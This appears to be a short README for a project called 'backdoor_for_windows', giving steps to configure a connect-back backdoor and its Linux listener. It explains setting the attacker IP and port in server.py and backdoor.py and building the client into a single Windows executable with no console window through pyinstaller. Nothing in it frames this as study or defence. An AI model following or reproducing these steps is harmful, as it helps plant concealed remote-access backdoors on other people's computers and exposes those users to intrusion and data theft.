# backdoor_for_windows
-You'll need linux and windows machine to do this

.Edit server.py for your own ip and port number on "sock.bind(your_ip,your_port)"

.Edit backdoor.py for your own ip and port number on "s.connect(your_ip,your_port)"

.create .exe file out of backdoor.py using windows machine(python installed) and using pyinstaller "pyinstaller  backdoor.py  --onefile  --noconsole" 

.server.py has to work on linux "python3  server.py"

